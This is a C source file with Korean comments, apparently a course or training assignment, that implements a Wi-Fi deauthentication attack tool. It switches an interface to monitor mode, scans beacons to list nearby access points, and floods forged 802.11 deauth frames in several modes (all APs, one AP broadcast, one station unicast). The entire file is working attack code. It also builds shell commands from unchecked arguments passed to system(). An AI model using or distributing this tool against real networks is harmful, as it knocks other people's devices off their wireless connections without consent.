#include <stdio.h>
#include <stdint.h> // uint
#include <pcap.h>   // pcap
#include <unistd.h> // sleep
#include <string.h> // memcpy, memcmp, memset, strcat
#include <ctype.h>  // isupper
#include <stdlib.h> // exit
#include <pthread.h>// thread

// #########################################################################
// [구조체 영역] (지난번 피드백 반영)

struct Radiotap {
    uint8_t header_revison = 0x00;
    uint8_t header_pad = 0x00;
    uint16_t header_length = 0x000c;
    uint32_t header_presentflag = 0x00000804;
    uint8_t datarate = 0x02;
    uint8_t idontknow[3] = {0x00, 0x00, 0x00}; // wireshark check <not found>
}; // radiotap 12byte

struct DeAuth {
    uint16_t frame_control_field = 0x00c0;
    uint16_t duration = 0x013a;
    uint8_t destination_address[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t source_address[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t bssid[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint16_t sequence_number = 0x0000;
}; // 24byte

struct DeAuth_WirelessMenigement {
    uint16_t wireless_management = 0x0007;
}; // 2byte

struct Deauth_Packet{
    struct Radiotap radiotap;
    struct DeAuth deauth;
    struct DeAuth_WirelessMenigement wirelessmenigement;
};
// Radiotap + DeAuth + DeAuth_WirelessMenigement
// 38byte

struct Beacon_Packet {
    uint16_t type;
    uint16_t duration;
    uint8_t destination_address[6];
    uint8_t source_address[6];
    uint8_t bssid[6];
    uint16_t sequence_number = 0x0000;
}; // 24byte

struct Channel_loop{
    char number[4]={0,};
}; // 4byte

struct Wifi_Info{
    uint8_t bssid[6];
    uint8_t ch;
    char ssid[32];
    unsigned int count=0;
}; // 43byte

struct Deauth_Packet data;  // DeAuth 패킷을 구성할 구조체
struct Wifi_Info list[100]; // ALL_LIST Attack에 사용할 리스트를 저장할 구조체
int list_max=-1;            // 리스트 최대 크기를 기록할 변수
uint8_t search_end=0;       // Thread1의 채널 탐색이 끝날 경우, Thread2를 종료해줄 변수
// 전역변수로 선언하여 힙 공간에 할당

// #########################################################################
void usage() {
    printf("syntax: ./deauth <interface> <option>\n");
    printf("\n");
    printf("-all [list/beacon] : 검색되는 모든 AP를 대상으로 공격합니다.\n");
    printf("      list = 프로그램 시작시, 검색되는 AP를 리스트하여 해당 AP만 공격합니다.\n");
    printf("             (속도 빠름, 새로운 AP 반영 불가)\n");
    printf("      beacon = Beacons 패킷이 잡히는 모든 AP를 공격합니다.\n");
    printf("             (속도 느림, 새로운 AP 반영 가능)\n");
    printf("\n");
    printf("-ap <AP MAC> [-stn <STN MAC>] [-ch <CH NUM>]:\n");
    printf("      -ap 옵션만 지정된 경우, 해당 AP를 AP Brodcast 방식으로 공격합니다.\n");
    printf("      -stn 옵션과 같이 지정된 경우, 해당 STATION만 Station Unicast 방식으로 공격합니다.\n");
    printf("      -ch 옵션과 같이 지정된 경우, 해당 채널로 바꿔서 공격을 수행합니다.\n");
    exit(0);
} // 사용 예시 출력 함수.

void char2byte(uint8_t i, char *argv){
// 맥 주소를 char 형식에서 int 형식으로 바꿔줍니다.
// (ex. FF:FF:FF:FF:FF:FF -> 255 255 255 255 255 255

    uint8_t j, count=0;
    int save=0;
    char temp[17];
    if (strlen(argv) == 17){ //  숫자, 문자, 특수문자 총 17자
        memcpy(temp, argv, 17);
        for (j=0; j<=16; j++){
        if (islower(temp[j]) != 0) temp[j] = temp[j]-32; // 소문자면 대문자로 치환
            if (count == 0){ // 두 번째 자리 수이면, (ex. X0)
                if ((temp[j] >= 65) && (temp[j] <= 70)){ // (대)문자의 경우,
                    save = save + 160 + ((temp[j] - 65) * 16);
                } else if ((temp[j] >= 48) && (temp[j] <= 57)) {
                    save = save + ((temp[j] - 48) * 16); // 숫자의 경우,
                } else {
                    usage();
                }
                count = 1;
            } else { // 첫 번째 자리 수이면, (ex. 0X)
                if ((temp[j] >= 65) && (temp[j] <= 70)){
                    save = save + (temp[j] - 55);  //  (대)문자의 경우,
                } else if ((temp[j] >= 48) && (temp[j] <= 57)) {
                    save = save + ((temp[j] - 48)); // 숫자의 경우,
                } else {
                    usage();
                }
                j=j+1;
                count = 0;
                if (i == 0){
                    data.deauth.bssid[j/3] = save;
                } else {
                    data.deauth.source_address[j/3] = save;
                } // i 값에 따라 각각 다르게 저장함.
                save = 0;
            }
        }
    } else {
        usage();
    }
}
// #########################################################################
void *thread1_ftn(void *arg){
    struct Channel_loop channel[32];
    FILE *fp = 0x00;
    char line[32];
    char monitormode[70];
    char dev[30];

    memcpy(dev,arg,30);
    memset(monitormode,0,70);
    sprintf(monitormode, "iwlist %s channel | grep [0-9][0-9].:",dev);
    // iwlist 명령어를 구성함.

    if ((fp = popen(monitormode,"r")) == 0x00){
        return 0;
    } // pipe를 통해 랜카드가 지원하는 채널 정보를 가져옴.
    // (지난번 피드백 반영)

    int i,max=0;
    while(fgets(line, 34, fp) != 0x00) {
        strtok(line,":");

        for (i=18; i<=20; i++){
            if (line[i] == 0x20) break;
            channel[max].number[i-18] = line[i];
        }
        max=max+1;
    } // 각각의 채널을 파싱해서 저장함.
    pclose(fp);
    max=max-1;

    sleep(1);
    system("clear");

    for (i=0; i<=max; i++){
        usleep(300000);
        printf("※  주변 와이파이 스캔 중... (%s CH) [%d/%d]\n",channel[i].number,i+1,max+1);
        memset(monitormode,0,70);
        sprintf(monitormode, "iwconfig %s ch %s", dev, channel[i].number);
        system(monitormode);
    } // 최대로 지원하는 채널의 개수만큼 반복하면서
      // 랜카드의 채널을 변경함.

    search_end = 1;
    // Thread2에서 AP 탐색을 멈추도록 함.

    struct Wifi_Info temp;
    for(i=0; i<=list_max-1; i++){
        if (list[i].ch > list[i+1].ch) {
            memcpy(temp.ssid, list[i].ssid, 32);
            memcpy(temp.bssid, list[i].bssid, 6);
            temp.ch = list[i].ch;
            memcpy(list[i].ssid, list[i+1].ssid, 32);
            memcpy(list[i].bssid, list[i+1].bssid, 6);
            list[i].ch = list[i+1].ch;
            memcpy(list[i+1].ssid, temp.ssid, 32);
            memcpy(list[i+1].bssid, temp.bssid, 6);
            list[i+1].ch = temp.ch;
            i = -1;
        }
    } // 검색된 리스트를 채널 순으로 정렬함.

    return 0;
}
// #########################################################################
void *thread2_ftn(void *arg){
    char dev[30];
    memcpy(dev,arg,30);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 인자 값으로 받은 네트워크 장치를 사용해 promiscuous 모드로 pcap를 연다.

    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        exit(0);
    } // 열지 못하면 메세지 출력 후 종료.

    while (search_end == 0){
        struct pcap_pkthdr* header;
        const u_char* packet;
        struct  Radiotap* radiotap;
        struct  Beacon_Packet* beacon_data;

        int i, check=0;
        int res = pcap_next_ex(handle, &header, &packet);
        // 다음 패킷을 잡고 성공시 1을 반환한다.

        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        } // 에러와(-1), EOF(-2)시 종료한다.

        if (search_end) break;

        radiotap = (Radiotap*)packet;
        packet = packet + radiotap->header_length;
        // radiotap 헤더의 길이를 가져와서 그 만큼 넘긴다. (지난번 피드백 반영)
        beacon_data = (Beacon_Packet*)packet;


        if (beacon_data->type == 0x80){
        // 새로 잡은 데이터가 Beacons Frame이면,
            for (i=0; i<=list_max; i++){
                if (memcmp(beacon_data->bssid, list[i].bssid,6) == 0){
                    check = 1;
                    break; // 기존 리스트에 있으면 for 탈출. (지난번 피드백 반영)
                    // 배열 하나 하나 비교 -> memcmp로 바로 비교
                }
            } // 새로 잡은 data의 맥주소가 기존의 리스트에 있는지 탐색.

            if (check == 0){ // 만약 기존 리스트에 없다면
                list_max = list_max + 1;
                memcpy(list[list_max].bssid, beacon_data->bssid, 6);
                packet = packet + 24; // beacon frame 만큼 넘긴다.
                packet = packet + 12; // fixed parameter 만큼 넘긴다.
                if (packet[0] == 0){  // taged parameter 시작 부분이 SSID이면,
                    for (i=1; i<=packet[1]; i++){
                        if (packet[1+i] == 0) {
                            strcat(list[list_max].ssid,"<HIDDEN SSID>");
                            break;
                            // HIDDEN SSID의 경우 해당 문자열을 기록하고 for 탈출.
                        } else {
                            list[list_max].ssid[i-1] = packet[1+i];
                        }  // 일반 SSID의 경우 문자열을 저장.
                    }
                }
                packet = packet + packet[1] + 2; // ssid parameter 만큼 넘김.

                while (packet[0]!=0){ // tag number가 0일 될 때까지
                    if (packet[0] == 3){ // 다음 tag가 DS Parameter이면,
                        list[list_max].ch = packet[2];
                        break;
                    } else if (packet[0] == 61){ // 다음 tag가 HT Information이면,
                        list[list_max].ch = packet[2]; // (5Ghz AP를 대비함.)
                        break;
                    }
                    packet = packet + packet[1] + 2; // 다음 파라미터를 탐색할 수 있도록 넘김.
                }

                printf("※  와이파이 발견! (CH: %d\tSSID: %s)\n",list[list_max].ch, list[list_max].ssid);
            }
        }

    }
    pcap_close(handle);
    return 0;
}
// #########################################################################
void *thread3_ftn(void *arg){
    struct Channel_loop channel[32];
    FILE *fp = 0x00;
    char line[32];
    char monitormode[70];
    char dev[30];

    memcpy(dev,arg,30);
    memset(monitormode,0,70);
    sprintf(monitormode, "iwlist %s channel | grep [0-9][0-9].:",dev);
    // iwlist 문자열을 구성함.

    if ((fp = popen(monitormode,"r")) == 0x00){
        return 0;
    } // pipe로 해당 랜카드가 지원하는 채널 정보를 가져옴
      // (지난번 피드백 반영)

    int i,max=0;
    while(fgets(line, 34, fp) != 0x00) {
        strtok(line,":");
        for (i=18; i<=20; i++){
            if (line[i] == 0x20) break;
            channel[max].number[i-18] = line[i];
        }
        max=max+1;
    } // 해당 채널 정보를 파싱하여 저장함.
    pclose(fp);

    i=0;
    max=max-1;

    sleep(1);
    while (true) {
        for (i=0; i<=max; i++){
            memset(monitormode,0,70);
            sprintf(monitormode, "iwconfig %s ch %s", dev, channel[i].number);
            system(monitormode);
        }
    } // 채널 변경을 무한 반복
    return 0;
}
// #########################################################################


int main(int argc, char *argv[])
{
    if (2 >= argc) usage();

    char* dev = argv[1]; // "wlxec086b1353a9";
    char monitormode[70];
    memset(monitormode,0,70);
    sprintf(monitormode, "ifconfig %s down", dev);
    system(monitormode);
    sprintf(monitormode, "iwconfig %s mode monitor", dev);
    system(monitormode);
    sprintf(monitormode, "ifconfig %s up", dev);
    system(monitormode);
    // 자동으로 모니터 모드로 전환.

    int i;
    uint8_t check=0;
    for (i=2; argv[i] != 0 ; i++){
        if ((i==2) && (memcmp(argv[i],"-all",4) == 0)) { // all
            if (memcmp(argv[i+1],"list",4) == 0) {
                check = 3;
            } else if (memcmp(argv[i+1],"beacon",6) == 0){
                check = 4;
            } else {
                usage();
            }
        // 입력한 2번째 인자 값이 all 인 경우, 다음 값이 list와 beacon인지 체크.
        } else if (memcmp(argv[i],"-ap",3) == 0) {
            char2byte(0,argv[i+1]);
            check = check + 1;
            // ap 옵션의 경우, char2byte 함수에 0 인자 값을 넣어 전달.
        } else if (memcmp(argv[i],"-stn",4) == 0) {
            char2byte(1,argv[i+1]);
            check = check + 1;
            // stn 옵션의 경우, char2byte 함수에 1 인자 값을 넣어 전달.
        } else if (memcmp(argv[i],"-ch",3) == 0) {
            if (check >= 3) usage();
            memset(monitormode,0,70);
            sprintf(monitormode, "iwconfig %s ch %s", dev, argv[i+1]);
            system(monitormode);
            // ch 옵션의 경우, 채널을 변경함.
        }
    }

    pthread_t thread1_handle, thread2_handle, thread3_handle;
    int thread1_status, thread2_status, thread3_status;

    switch (check) {
        case 1: // AP Brodcast
            for (i=0; i<=5; i++) {
                data.deauth.source_address[i] = data.deauth.bssid[i];
            }   // 이전에 저장해놨던 값을 AP Brodcast에 맞게 구성.
                // Destination addr은 기본 값이 FF:FF:FF:FF:FF:FF 임.
            break;
        case 2: // Station Unicast
            for (i=0; i<=5; i++) {
                data.deauth.destination_address[i] = data.deauth.bssid[i];
            }   // 이전에 저장해놨던 값을Station Unicast에 맞게 구성.
            break;
        case 3: // DeAuth Jamming (list)
            if (pthread_create(&thread1_handle,0,thread1_ftn,dev) < 0){
                printf("Thread Create Error!");
                exit(0);
            }
            if (pthread_create(&thread2_handle,0,thread2_ftn,dev) < 0){
                printf("Thread Create Error!");
                exit(0);
            } // 1번, 2번 스레드를 생성함.
            break;
        case 4: // DeAuth Jamming (beacon)
            if (pthread_create(&thread3_handle,0,thread3_ftn,dev) < 0){
                printf("Thread Create Error!");
                exit(0);
            } // 3번 스레드를 생성함.
            break;
        default:
            usage();
            break;
            // 해당하지 않으면 종료
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 인자 값으로 받은 네트워크 장치를 사용해 promiscuous 모드로 pcap를 연다.

    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    } // 열지 못하면 메세지 출력 후 비정상 종료.


    unsigned int num=0;
    int list_count=-1;

    while (true) {
        if (check == 3){
        // ALL LIST 공격의 경우,
            while(search_end == 0){
                sleep(1);
            }  // 채널 검색 스레드가 닫힐 때 까지 기다림.

            if (list_count < list_max){
                list_count = list_count + 1;
            } else {
                list_count = 0;
            } // list count값을 조정함.

            if (list_max != -1){
                memcpy(data.deauth.source_address, list[list_count].bssid, 6);
                memcpy(data.deauth.bssid, data.deauth.source_address, 6);
                list[list_count].count = list[list_count].count + 1;
            } // 해당 list의 bssid 주소 값을 deauth 공격에 사용함/

            if (list_count >= 1){
                if (list[list_count].ch != list[list_count-1].ch){
                    memset(monitormode,0,70);
                    sprintf(monitormode, "iwconfig %s ch %d", dev, list[list_count].ch);
                    system(monitormode);
                } // list 0번 배열이 아니라면, 바로 뒤 리스트 배열의 채널과 다른지 비교하고
                // 다르면 이번 list 항목의 채널로 변경함.
            } else {
                memset(monitormode,0,70);
                sprintf(monitormode, "iwconfig %s ch %d", dev, list[list_count].ch);
                system(monitormode);
            } // list 0번 배열이면 채널을 변경함.

            int j;
            system("clear");
            printf("Num\tSource Mac\t\tDestination Mac\t\tCou\tCH\tSSID\n");
            for(i=0; i<=list_max; i++){
                printf("%d.\t [",i);
                for (j=0; j<=5; j++){
                    printf("%02X",list[i].bssid[j]);
                    if (j<5) printf(":");
                }
                printf("]\t[FF:FF:FF:FF:FF:FF]");
                printf("\t%u\t%d\t%s\n",list[i].count, list[i].ch, list[i].ssid);
            }
            // 형식에 맞게 출력해줌.
        } else {
            if (check == 4) { // ALL BEACON 공격의 경우,
                struct pcap_pkthdr* header;
                const u_char* packet;
                struct  Radiotap* radiotap;
                struct  Beacon_Packet* beacon_data;

                int res = pcap_next_ex(handle, &header, &packet);
                // 다음 패킷을 잡고 성공시 1을 반환한다.

                if (res == -1 || res == -2) {
                    printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                    exit(0);
                } // 에러와(-1), EOF(-2)시 종료한다.

                radiotap = (Radiotap*)packet;
                packet = packet + radiotap->header_length;
                beacon_data = (Beacon_Packet*)packet;

                if (beacon_data->type == 0x80){
                    memcpy(data.deauth.source_address, beacon_data->bssid, 6);
                    memcpy(data.deauth.bssid, data.deauth.source_address, 6);
                } // Beacon 패킷이면 DeAuth 공격의 타겟을 Beacon 패킷을 보낸 AP로 지정.
            }
            num = num + 1;
            printf("%d.\t DeAuth Attack [",num);

            for (i=0; i<=5; i++){
                printf("%02X",data.deauth.source_address[i]);
                if (i<5) printf(":");
            }
            printf("] -> [");
            for (i=0; i<=5; i++){
                printf("%02X",data.deauth.destination_address[i]);
                if (i<5) printf(":");
            }
            printf("]\n");
            // 형식에 맞게 출력.

            usleep(100000);
            // 딜레이
        }

        int length;
        length = sizeof(data.deauth) + sizeof(data.radiotap) + sizeof(data.wirelessmenigement);
        if (pcap_sendpacket(handle, (unsigned char*)&data, length) != 0){
            printf("DeAuth Attack Fail..\n");
            exit (-1);
            // 모든 공격 공통으로 Deauth 패킷을 보냄
        }
    }

    pcap_close(handle);
    // 무한 반복 함수가 끝난 경우 pcap 핸들을 닫음.

    if (check == 3) {
        pthread_join(thread1_handle,(void **)&thread1_status);
        pthread_join(thread2_handle,(void **)&thread2_status);
    } else if (check == 4){
        pthread_join(thread2_handle,(void **)&thread3_status);
    } // 스레드가 생성된 경우, 스레드가 종료될 때 까지 기다림

}
